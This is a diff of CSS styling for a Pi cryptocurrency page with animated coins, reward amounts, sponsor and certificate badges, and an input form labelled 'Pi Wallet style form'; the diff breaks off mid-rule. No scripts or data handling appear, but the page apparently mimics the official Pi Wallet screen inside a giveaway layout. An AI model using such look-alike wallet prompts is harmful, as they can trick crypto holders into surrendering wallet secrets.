@@ -8,32 +8,35 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --pi-purple: #8e24aa;
-            --pi-purple-light: #b347ea;
-            --pi-purple-dark: #5c007a;
-            --pi-purple-gradient: linear-gradient(135deg, #8e24aa, #5c007a);
-            --pi-gold: #ffc107;
+            --pi-purple: #7a35a4;
+            --pi-purple-light: #9a53c6;
+            --pi-purple-dark: #5c267c;
+            --pi-gold: #f8c056;
+            --pi-gold-light: #ffd78c;
+            --pi-gold-dark: #e6a938;
         }
         
         /* Dark mode styles */
         @media (prefers-color-scheme: dark) {
             :root {
-                --bg-primary: #180830;
+                --bg-primary: #1a0e24;
                 --bg-secondary: #2a1052;
                 --text-primary: #ffffff;
-                --text-secondary: #cccccc;
-                --card-bg: rgba(40, 10, 60, 0.8);
+                --text-secondary: #e0d0ff;
+                --card-bg: rgba(30, 12, 48, 0.85);
+                --input-bg: rgba(30, 12, 48, 0.5);
             }
         }
         
         /* Light mode styles */
         @media (prefers-color-scheme: light) {
             :root {
-                --bg-primary: #f8f4ff;
+                --bg-primary: #f5efff;
                 --bg-secondary: #eee6ff;
                 --text-primary: #333333;
                 --text-secondary: #666666;
-                --card-bg: rgba(255, 255, 255, 0.9);
+                --card-bg: rgba(255, 255, 255, 0.85);
+                --input-bg: rgba(255, 255, 255, 0.8);
             }
         }
         
@@ -41,71 +44,338 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: var(--bg-primary);
             color: var(--text-primary);
-            transition: background-color 0.3s ease;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
             overflow-x: hidden;
+            position: relative;
         }
         
-        .bg-gradient {
-            background: var(--pi-purple-gradient);
+        .pi-header {
+            background-color: var(--pi-purple);
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+            height: 64px;
+            z-index: 50;
+            box-shadow: 0 4px 20px rgba(122, 53, 164, 0.3);
         }
         
-        .header-glow {
-            box-shadow: 0 0 30px rgba(142, 36, 170, 0.5);
+        .pi-header-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            position: relative;
         }
         
-        .star {
+        .header-back-btn {
             position: absolute;
-            background-color: white;
-            border-radius: 50%;
-            filter: blur(1px);
-            opacity: 0.8;
-            animation: twinkle 4s infinite ease-in-out;
+            left: 0;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            transition: transform 0.2s;
         }
         
-        .pi-coin {
+        .header-back-btn:hover {
+            transform: translateX(-2px);
+        }
+        
+        .header-dropdown-btn {
             position: absolute;
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            background: radial-gradient(circle at 30% 30%, var(--pi-gold), #e6b422);
-            box-shadow: 0 0 20px rgba(255, 218, 123, 0.7);
+            right: 0;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            transition: transform 0.2s;
+        }
+        
+        .header-dropdown-btn:hover {
+            transform: translateY(2px);
+        }
+        
+        .wallet-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: bold;
             color: var(--pi-purple);
-            animation: float 6s infinite ease-in-out;
-            z-index: 1;
+            margin-right: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .wallet-icon::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0) 40%,
+                rgba(255, 255, 255, 0.4) 50%,
+                rgba(255, 255, 255, 0) 60%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shineIcon 3s infinite;
+        }
+        
+        .wallet-text {
+            color: white;
+            font-size: 18px;
+            font-weight: 500;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+        
+        .pi-coin-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: var(--pi-purple);
+            margin-left: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .pi-coin-icon::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0) 40%,
+                rgba(255, 255, 255, 0.4) 50%,
+                rgba(255, 255, 255, 0) 60%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shineIcon 3s infinite;
+            animation-delay: 1s;
+        }
+        
+        /* Premium background elements */
+        .premium-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -10;
+            overflow: hidden;
+        }
+        
+        /* Animated gradient */
+        .animated-gradient {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(154, 83, 198, 0.08) 0%, transparent 60%),
+                radial-gradient(circle at 80% 20%, rgba(154, 83, 198, 0.08) 0%, transparent 50%),
+                radial-gradient(circle at 10% 80%, rgba(154, 83, 198, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 90% 90%, rgba(154, 83, 198, 0.08) 0%, transparent 40%);
+            opacity: 0.9;
+            animation: pulseGradient 15s infinite alternate;
+        }
+        
+        /* Light streaks */
+        .light-streak {
+            position: absolute;
+            height: 1px;
+            width: 200px;
+            background: linear-gradient(90deg, transparent, rgba(154, 83, 198, 0.5), transparent);
+            border-radius: 100%;
+            opacity: 0;
+            animation: lightStreak 8s linear infinite;
+        }
+        
+        /* Moving waves */
+        .wave-container {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            opacity: 0.3;
+        }
+        
+        .wave {
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            border-radius: 40%;
+            opacity: 0.2;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: waveRotate 30s linear infinite;
+        }
+        
+        .wave1 {
+            border: 1px solid rgba(154, 83, 198, 0.3);
+            animation-duration: 30s;
+        }
+        
+        .wave2 {
+            border: 1px solid rgba(248, 192, 86, 0.3);
+            animation-duration: 25s;
+            animation-direction: reverse;
+        }
+        
+        .wave3 {
+            border: 1px solid rgba(154, 83, 198, 0.2);
+            animation-duration: 35s;
+        }
+        
+        /* Stars */
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            filter: blur(1px);
+            opacity: 0.4;
+            animation: twinkle 4s infinite ease-in-out;
+        }
+        
+        /* Pi coins */
+        .premium-coin {
+            position: absolute;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: var(--pi-purple);
+            z-index: -1;
             transform-style: preserve-3d;
             perspective: 1000px;
         }
         
-        .pi-coin::before {
-            content: "π";
+        .coin-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            text-align: center;
+            transition: transform 0.6s;
+            transform-style: preserve-3d;
+            animation: coinRotate 10s infinite linear;
+        }
+        
+        .coin-front, .coin-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            backface-visibility: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 2rem;
             font-weight: bold;
         }
         
-        .bg-waves {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            left: 0;
-            background: 
-                radial-gradient(circle at 80% 10%, rgba(142, 36, 170, 0.2) 0%, transparent 60%),
-                radial-gradient(circle at 10% 80%, rgba(92, 0, 122, 0.2) 0%, transparent 60%);
-            z-index: -2;
+        .coin-front {
+            background: radial-gradient(circle at 30% 30%, var(--pi-gold), var(--pi-gold-dark));
+            box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
         }
         
+        .coin-back {
+            background: radial-gradient(circle at 30% 30%, var(--pi-gold-dark), var(--pi-gold));
+            transform: rotateY(180deg);
+            box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
+        }
+        
+        /* Floating particles */
+        .particle {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background-color: rgba(154, 83, 198, 0.2);
+            border-radius: 50%;
+            filter: blur(1px);
+            animation: floatParticle 15s infinite linear;
+        }
+        
+        /* Page container and transitions */
+        .page-container {
+            width: 100%;
+            max-width: 100vw;
+            overflow-x: hidden;
+            min-height: calc(100vh - 64px);
+            position: relative;
+        }
+        
+        .page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            min-height: calc(100vh - 64px);
+            transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            background-color: transparent;
+            z-index: 10;
+        }
+        
+        .page-active {
+            transform: translateX(0);
+            opacity: 1;
+            z-index: 11;
+        }
+        
+        .page-inactive-right {
+            transform: translateX(100%);
+            opacity: 0;
+            z-index: 9;
+            pointer-events: none;
+        }
+        
+        .page-inactive-left {
+            transform: translateX(-100%);
+            opacity: 0;
+            z-index: 9;
+            pointer-events: none;
+        }
+        
+        /* Premium cards */
         .card {
             background-color: var(--card-bg);
             backdrop-filter: blur(15px);
-            border-radius: 1.5rem;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border-radius: 1.2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border: 1px solid rgba(255, 255, 255, 0.1);
             overflow: hidden;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
         
         .card::before {
@@ -116,25 +386,51 @@
             width: 100%;
             height: 100%;
             background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
-            z-index: -1;
+            pointer-events: none;
+        }
+        
+        .card::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.1),
+                transparent
+            );
+            transition: left 0.7s ease;
+            pointer-events: none;
         }
         
         .card:hover {
             transform: translateY(-5px);
-            box-shadow: 0 15px 40px rgba(142, 36, 170, 0.2);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
         }
         
+        .card:hover::after {
+            left: 100%;
+        }
+        
+        /* Premium buttons */
         .btn-primary {
-            background: var(--pi-purple);
+            background: linear-gradient(135deg, var(--pi-purple), var(--pi-purple-dark));
             color: white;
-            font-weight: bold;
-            border-radius: 0.8rem;
-            padding: 0.75rem 1.8rem;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: 0.9rem 2rem;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 20px rgba(142, 36, 170, 0.4);
+            box-shadow: 0 6px 15px rgba(122, 53, 164, 0.25);
             position: relative;
             overflow: hidden;
             z-index: 1;
+            border: none;
+            outline: none;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
         
         .btn-primary::before {
@@ -150,89 +446,100 @@
         }
         
         .btn-primary:hover {
-            background: var(--pi-purple-light);
-            transform: translateY(-3px) scale(1.03);
-            box-shadow: 0 8px 25px rgba(142, 36, 170, 0.5);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(122, 53, 164, 0.4);
         }
         
         .btn-primary:hover::before {
             left: 100%;
         }
         
-        .reward-card {
-            border-left: 4px solid var(--pi-purple);
-            transition: all 0.3s ease;
-            position: relative;
+        .btn-primary:active {
+            transform: translateY(1px);
         }
         
-        .reward-card::after {
+        .btn-secondary {
+            background: rgba(122, 53, 164, 0.1);
+            color: var(--pi-purple);
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: 0.75rem 1.5rem;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(122, 53, 164, 0.2);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(122, 53, 164, 0.15);
+            transform: translateY(-2px);
+        }
+        
+        /* Premium reward cards */
+        .reward-card {
+            position: relative;
+            transition: all 0.3s ease;
+            overflow: hidden;
+            border-top: 3px solid transparent;
+            background: linear-gradient(var(--card-bg), var(--card-bg)) padding-box,
+                       linear-gradient(90deg, var(--pi-purple), var(--pi-gold)) border-box;
+        }
+        
+        .reward-card::before {
             content: '';
             position: absolute;
             top: 0;
-            right: 0;
-            bottom: 0;
-            width: 4px;
-            background: linear-gradient(to bottom, transparent, var(--pi-purple), transparent);
-            opacity: 0;
-            transition: opacity 0.3s ease;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, var(--pi-purple), var(--pi-gold));
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.5s ease;
         }
         
         .reward-card:hover {
-            transform: scale(1.03);
-            border-left-width: 6px;
+            transform: translateY(-7px) scale(1.02);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
         }
         
-        .reward-card:hover::after {
-            opacity: 1;
+        .reward-card:hover::before {
+            transform: scaleX(1);
         }
         
         .reward-amount {
             color: var(--pi-purple);
             font-weight: bold;
-            font-size: 1.8rem;
+            font-size: 2rem;
             display: flex;
             align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 1;
         }
         
         .reward-amount::before {
             content: "π";
-            font-size: 2rem;
+            font-size: 2.2rem;
             margin-right: 0.2rem;
         }
         
-        .shine-effect {
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .shine-effect::after {
+        .reward-amount::after {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                to bottom right,
-                rgba(255, 255, 255, 0) 0%,
-                rgba(255, 255, 255, 0) 40%,
-                rgba(255, 255, 255, 0.3) 50%,
-                rgba(255, 255, 255, 0) 60%,
-                rgba(255, 255, 255, 0) 100%
-            );
-            transform: rotate(30deg);
-            transition: transform 0.5s ease;
-            pointer-events: none;
+            width: 70px;
+            height: 70px;
+            background: radial-gradient(circle, rgba(248, 192, 86, 0.15) 0%, transparent 70%);
+            border-radius: 50%;
+            z-index: -1;
+            animation: pulseBg 2s infinite;
         }
         
-        .shine-effect:hover::after {
-            transform: rotate(30deg) translate(100%, 100%);
-        }
-        
+        /* Premium progress bar */
         .progress-bar {
             height: 8px;
             border-radius: 10px;
-            background: rgba(142, 36, 170, 0.2);
+            background: rgba(122, 53, 164, 0.1);
             overflow: hidden;
             position: relative;
         }
@@ -249,135 +556,551 @@
             content: '';
             position: absolute;
             top: 0;
-            left: 0;
+            left: -100%;
             width: 100%;
             height: 100%;
             background: linear-gradient(
                 90deg,
                 transparent,
-                rgba(255, 255, 255, 0.4),
+                rgba(255, 255, 255, 0.2),
                 transparent
             );
             animation: progressShine 2s infinite linear;
         }
         
-        #walletForm, #successModal {
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            opacity: 0;
-            visibility: hidden;
-        }
-        
-        #walletForm.active, #successModal.active {
-            opacity: 1;
-            visibility: visible;
-        }
-        
-        .shake {
-            animation: shake 0.5s ease-in-out;
-        }
-        
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        
-        .float {
-            animation: float 6s infinite ease-in-out;
-        }
-        
+        /* Premium feature icons */
         .feature-icon {
-            width: 64px;
-            height: 64px;
-            border-radius: 16px;
-            background: linear-gradient(135deg, rgba(142, 36, 170, 0.8), rgba(92, 0, 122, 0.8));
-            box-shadow: 0 8px 16px rgba(142, 36, 170, 0.3);
+            width: 70px;
+            height: 70px;
+            border-radius: 18px;
+            background: linear-gradient(135deg, var(--pi-purple-light), var(--pi-purple));
+            box-shadow: 0 8px 20px rgba(122, 53, 164, 0.2);
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 1rem;
             position: relative;
             overflow: hidden;
+            transform: translateZ(0);
         }
         
         .feature-icon::before {
             content: '';
             position: absolute;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-            top: 0;
-            left: -100%;
-            transition: left 0.5s ease;
-        }
-        
-        .feature-icon:hover::before {
-            left: 100%;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0) 40%,
+                rgba(255, 255, 255, 0.3) 50%,
+                rgba(255, 255, 255, 0) 60%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shineFeature 3s infinite;
         }
         
         .feature-icon i {
-            font-size: 1.8rem;
+            font-size: 2rem;
             color: white;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Pi Wallet style form */
+        .pi-wallet-style {
+            margin: 0 auto;
+            max-width: 500px;
+            padding: 0 20px;
+        }
+
+        .pi-title {
+            font-size: 2.5rem;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .pi-input-container {
+            margin-bottom: 1.5rem;
+            border-radius: 16px;
+            overflow: hidden;
+            background: var(--input-bg);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .pi-input {
+            width: 100%;
+            padding: 24px;
+            background: transparent;
+            border: none;
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            outline: none;
+        }
+
+        .pi-button {
+            width: 100%;
+            padding: 16px;
+            font-size: 1rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            text-align: center;
+            border-radius: 16px;
+            margin-bottom: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .pi-button-primary {
+            background-color: var(--pi-purple);
+            color: white;
+            border: none;
+            box-shadow: 0 6px 12px rgba(122, 53, 164, 0.25);
+        }
+
+        .pi-button-primary:hover {
+            background-color: var(--pi-purple-light);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(122, 53, 164, 0.35);
+        }
+
+        .pi-button-secondary {
+            background-color: transparent;
+            color: var(--pi-purple);
+            border: 1px solid var(--pi-purple);
+        }
+
+        .pi-button-secondary:hover {
+            background-color: rgba(122, 53, 164, 0.05);
+            transform: translateY(-2px);
+        }
+
+        .pi-info-text {
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: var(--text-secondary);
+            margin-top: 2rem;
+            text-align: center;
+        }
+
+        .pi-link {
+            color: #3d9dff;
+            text-decoration: none;
+        }
+
+        /* Scroll animations */
+        .animate-on-scroll {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+
+        .animate-on-scroll.animated {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .animate-fade-in {
+            opacity: 0;
+            transition: opacity 1s ease;
+        }
+
+        .animate-fade-in.animated {
+            opacity: 1;
+        }
+
+        .animate-scale-in {
+            opacity: 0;
+            transform: scale(0.8);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+
+        .animate-scale-in.animated {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .animate-slide-left {
+            opacity: 0;
+            transform: translateX(50px);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+
+        .animate-slide-left.animated {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .animate-slide-right {
+            opacity: 0;
+            transform: translateX(-50px);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+
+        .animate-slide-right.animated {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .stagger-item {
+            opacity: 0;
+            transform: translateY(20px);
+        }
+
+        .stagger-item.animated {
+            animation: staggerAnimation 0.5s forwards;
+        }
+
+        /* Surprise explosion animation */
+        .surprise-container {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .surprise-trigger.active .explosion-particle {
+            animation: explode 1s forwards;
+        }
+
+        .explosion-particle {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: var(--pi-gold);
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Parallax effect */
+        .parallax-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            transition: transform 0.1s cubic-bezier(0.2, 0, 0.2, 1);
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
         }
         
-        .legal-notice {
+        .loading-spinner {
+            position: relative;
+            width: 80px;
+            height: 80px;
+        }
+        
+        .loading-spinner::before, 
+        .loading-spinner::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            border-top-color: var(--pi-purple);
+            animation: spin 1.5s linear infinite;
+            box-shadow: 0 0 10px rgba(122, 53, 164, 0.3);
+        }
+        
+        .loading-spinner::after {
+            border-top-color: transparent;
+            border-bottom-color: var(--pi-gold);
+            animation-duration: 1s;
+        }
+        
+        .loading-spinner-label {
+            position: absolute;
+            top: 120%;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+
+        /* Galaxy effect */
+        .galaxy-effect {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            z-index: -1;
+        }
+
+        .galaxy-effect.active {
+            opacity: 1;
+        }
+
+        .galaxy-star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            filter: blur(1px);
+        }
+
+        /* 3D effect */
+        .tilt-card {
+            transform-style: preserve-3d;
+            transform: perspective(1000px);
+            transition: transform 0.1s ease;
+        }
+
+        .tilt-card-inner {
+            transform-style: preserve-3d;
+            transition: transform 0.1s ease;
+        }
+
+        .tilt-card:hover {
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        /* About section with illustrations */
+        .about-illustration {
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 2rem;
+            position: relative;
+        }
+
+        .about-circle {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(154, 83, 198, 0.1), rgba(154, 83, 198, 0.2));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .about-circle::before {
+            content: '';
+            position: absolute;
+            width: 90%;
+            height: 90%;
+            border-radius: 50%;
+            border: 2px dashed rgba(154, 83, 198, 0.3);
+            animation: rotateCircle 30s linear infinite;
+        }
+
+        .about-icon {
+            font-size: 4rem;
+            color: var(--pi-purple);
+            position: relative;
+            z-index: 1;
+        }
+
+        .about-planets {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, var(--pi-gold), var(--pi-gold-dark));
+            box-shadow: 0 0 10px rgba(248, 192, 86, 0.4);
+            animation: orbitPlanet 15s linear infinite;
+        }
+
+        .about-planet-1 {
+            top: 10%;
+            left: 50%;
+            transform-origin: center 400%;
+            animation-duration: 15s;
+            width: 25px;
+            height: 25px;
+        }
+
+        .about-planet-2 {
+            top: 50%;
+            left: 10%;
+            transform-origin: 400% center;
+            animation-duration: 20s;
+            width: 20px;
+            height: 20px;
+        }
+
+        .about-planet-3 {
+            bottom: 10%;
+            right: 20%;
+            transform-origin: -100% -100%;
+            animation-duration: 25s;
+            width: 15px;
+            height: 15px;
+        }
+
+        /* Sponsor section enhancements */
+        .sponsor-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .sponsor-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .sponsor-logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 1rem;
+            background: radial-gradient(circle at 30% 30%, rgba(154, 83, 198, 0.2), rgba(154, 83, 198, 0.1));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .sponsor-logo i {
+            font-size: 2rem;
+            color: var(--pi-purple);
+        }
+
+        .sponsor-name {
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+
+        .sponsor-role {
             font-size: 0.85rem;
-            line-height: 1.4;
-            padding: 1rem;
-            border-radius: 0.8rem;
-            background-color: rgba(142, 36, 170, 0.1);
-            border-left: 3px solid var(--pi-gold);
+            color: var(--text-secondary);
+            text-align: center;
+        }
+
+        /* Certificate badge */
+        .certificate {
+            position: relative;
+            padding: 1.5rem;
+            border-radius: 1rem;
+            background: linear-gradient(135deg, rgba(248, 192, 86, 0.1), rgba(154, 83, 198, 0.1));
+            border: 1px dashed rgba(248, 192, 86, 0.3);
+            margin-top: 2rem;
+        }
+
+        .certificate-icon {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .certificate-icon i {
+            color: white;
+            font-size: 1.2rem;
+        }
+
+        .certificate-title {
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 0.5rem;
+            margin-top: 0.5rem;
+        }
+
+        .certificate-text {
+            text-align: center;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+
+        /* Floating decoration */
+        .floating-icon {
+            position: absolute;
+            z-index: -1;
+            opacity: 0.5;
+            animation: floatIcon 5s infinite ease-in-out;
+        }
+
+        .floating-icon-1 {
+            top: 10%;
+            right: 10%;
+            animation-delay: 0s;
+            font-size: 2rem;
+            color: var(--pi-purple-light);
+        }
+
+        .floating-icon-2 {
+            bottom: 20%;
+            left: 5%;
+            animation-delay: 1s;
+            font-size: 1.5rem;
+            color: var(--pi-gold);
+        }
+
+        .floating-icon-3 {
+            top: 30%;
+            left: 15%;
+            animation-delay: 2s;
+            font-size: 1.8rem;
+            color: var(--pi-purple);
+        }
+
+        .floating-icon-4 {
+            bottom: 10%;
+            right: 15%;
+            animation-delay: 3s;
+            font-size: 1.6rem;
+            color: var(--pi-gold-light);
+        }
+
+        /* Animations */
+        @keyframes shineIcon {
+            0% { transform: rotate(30deg) translateX(-100%); }
+            100% { transform: rotate(30deg) translateX(100%); }
         }
         
-        .modal-enter {
-            animation: modalEnter 0.5s forwards;
+        @keyframes shineFeature {
+            0% { transform: rotate(30deg) translateX(-100%); }
+            100% { transform: rotate(30deg) translateX(100%); }
         }
         
-        .modal-exit {
-            animation: modalExit 0.5s forwards;
-        }
-        
-        @keyframes modalEnter {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        @keyframes modalExit {
-            from {
-                opacity: 1;
-                transform: translateY(0);
-            }
-            to {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-        }
-        
-        @keyframes pulse {
-            0% {
-                box-shadow: 0 0 0 0 rgba(142, 36, 170, 0.6);
-            }
-            70% {
-                box-shadow: 0 0 0 15px rgba(142, 36, 170, 0);
-            }
-            100% {
-                box-shadow: 0 0 0 0 rgba(142, 36, 170, 0);
-            }
-        }
-        
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-8px); }
-            75% { transform: translateX(8px); }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
         
         @keyframes twinkle {
             0%, 100% { opacity: 0.2; transform: scale(1); }
-            50% { opacity: 0.8; transform: scale(1.2); }
+            50% { opacity: 0.5; transform: scale(1.2); }
         }
         
         @keyframes float {
@@ -386,334 +1109,465 @@
             75% { transform: translateY(-5px) rotate(-5deg); }
         }
         
+        @keyframes floatParticle {
+            0% { transform: translateY(0) translateX(0); }
+            25% { transform: translateY(-30px) translateX(10px); }
+            50% { transform: translateY(-10px) translateX(20px); }
+            75% { transform: translateY(-20px) translateX(-10px); }
+            100% { transform: translateY(0) translateX(0); }
+        }
+        
         @keyframes progressShine {
             from { transform: translateX(-100%); }
             to { transform: translateX(100%); }
         }
         
-        #loading {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
+        @keyframes pulseBg {
+            0% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.2); opacity: 0.9; }
+            100% { transform: scale(1); opacity: 0.7; }
         }
         
-        .spinner {
-            width: 80px;
-            height: 80px;
-            position: relative;
